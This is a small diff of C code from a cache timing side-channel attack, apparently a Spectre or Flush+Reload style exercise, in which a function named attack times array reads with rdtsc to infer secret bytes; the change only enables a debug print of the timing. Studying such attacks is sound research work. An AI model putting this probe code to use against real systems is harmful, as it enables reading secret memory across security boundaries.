@@ -34,7 +34,7 @@ char attack(void* attack_addr){
             uint8_t temp = B[guess*64]; //accessing the guess t2= rdtscp(); //read timer
             uint64_t t2 = _rdtsc(); //read timer
             uint64_t diff = t2-t1;
-            //printf("Time difference for %d: %lu \n",guess,diff);
+            printf("Time difference for %d: %lu \n",guess,diff);
         if (t2-t1 <= CACHE_HIT_THRESHOLD){
             results[guess] += 1; //potential secret
         }
